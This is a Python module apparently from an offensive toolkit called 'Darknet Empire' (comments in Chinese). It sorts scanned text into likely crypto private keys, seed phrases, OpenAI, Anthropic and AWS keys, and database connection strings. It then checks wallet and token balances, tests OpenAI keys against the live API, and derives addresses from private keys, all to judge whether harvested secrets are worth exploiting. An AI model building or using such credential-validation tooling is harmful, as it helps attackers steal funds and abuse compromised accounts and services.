"""
暗网帝国 - 资产验证器
验证扫描到的私钥/密钥/合约是否还有价值
"""

import re
import json
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


def classify_finding(raw_text: str) -> dict:
    """分类扫描到的内容，返回 {type, confidence, potential_value}"""
    result = {"type": "unknown", "confidence": 0.0, "potential_value": ""}

    patterns = {
        "eth_private_key": (
            r"\b(0x)?[0-9a-fA-F]{64}\b",
            0.7, "可能是以太坊私钥"
        ),
        "btc_private_key": (
            r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b",
            0.6, "可能是比特币私钥(WIF格式)"
        ),
        "mnemonic_12": (
            r"\b([a-z]+ ){11}[a-z]+\b",
            0.5, "可能是12词助记词"
        ),
        "mnemonic_24": (
            r"\b([a-z]+ ){23}[a-z]+\b",
            0.5, "可能是24词助记词"
        ),
        "api_key_openai": (
            r"\bsk-[a-zA-Z0-9]{20,60}\b",
            0.8, "可能是OpenAI API Key"
        ),
        "api_key_anthropic": (
            r"\bsk-ant-[a-zA-Z0-9_-]{20,80}\b",
            0.8, "可能是Anthropic API Key"
        ),
        "aws_access_key": (
            r"\bAKIA[0-9A-Z]{16}\b",
            0.6, "可能是AWS Access Key"
        ),
        "infura_key": (
            r"\b[0-9a-f]{32}\b",
            0.3, "可能是Infura项目ID"
        ),
        "rpc_url": (
            r"\bhttps?://[a-zA-Z0-9.-]+\.(infura|alchemy|moralis|llamarpc|quiknode)\.\S*\b",
            0.4, "可能是私有RPC端点"
        ),
        "etherscan_key": (
            r"\b[A-Z0-9]{34}\b",
            0.3, "可能是Etherscan API Key"
        ),
        "db_connection": (
            r"\b(mongodb|postgresql|mysql|redis)://[^ \n\r\t<>\"']+\b",
            0.7, "可能是数据库连接串"
        ),
        "private_key_var": (
            r'(?:PRIVATE_KEY|private_key|secretKey|SECRET_KEY|DEPLOYER_KEY|OWNER_KEY)\s*[:=]\s*["\']?([0-9a-fA-Fx]{64,66})["\']?',
            0.9, "明确命名的私钥变量"
        ),
    }

    for ptype, (pattern, confidence, desc) in patterns.items():
        m = re.search(pattern, raw_text)
        if m:
            if confidence > result["confidence"]:
                result = {
                    "type": ptype,
                    "confidence": confidence,
                    "potential_value": desc,
                    "matched": m.group(0)[:100]
                }

    return result


def check_eth_balance(rpc_url: str, address: str) -> float:
    """检查ETH地址余额"""
    payload = json.dumps({
        "jsonrpc": "2.0", "id": 1,
        "method": "eth_getBalance",
        "params": [address, "latest"]
    }).encode()
    try:
        req = Request(rpc_url, data=payload, headers={"Content-Type": "application/json"})
        with urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            if "result" in data:
                return int(data["result"], 16) / 1e18
    except Exception:
        pass
    return 0.0


def check_token_balance(explorer_url: str, address: str, api_key: str = "") -> list:
    """通过区块浏览器API检查代币余额"""
    tokens = []
    try:
        url = f"{explorer_url}?module=account&action=tokentx&address={address}&sort=desc"
        if api_key:
            url += f"&apikey={api_key}"
        req = Request(url, headers={"User-Agent": "Empire-Miner/1.0"})
        with urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
            if data.get("status") == "1":
                tokens = data.get("result", [])[:20]
    except Exception:
        pass
    return tokens


def check_openai_api_key(api_key: str) -> dict:
    """验证OpenAI API Key是否有效"""
    try:
        req = Request(
            "https://api.openai.com/v1/models",
            headers={"Authorization": f"Bearer {api_key}"}
        )
        with urlopen(req, timeout=10) as resp:
            if resp.status == 200:
                return {"valid": True, "info": "Key有效"}
    except HTTPError as e:
        return {"valid": False, "info": f"HTTP {e.code}"}
    except Exception as e:
        return {"valid": False, "info": str(e)[:100]}
    return {"valid": False, "info": "未知"}


def derive_eth_address(private_key: str) -> str:
    """从私钥推导以太坊地址"""
    try:
        from eth_account import Account
        if private_key.startswith("0x"):
            private_key = private_key[2:]
        acct = Account.from_key(private_key)
        return acct.address
    except ImportError:
        return ""
    except Exception:
        return ""
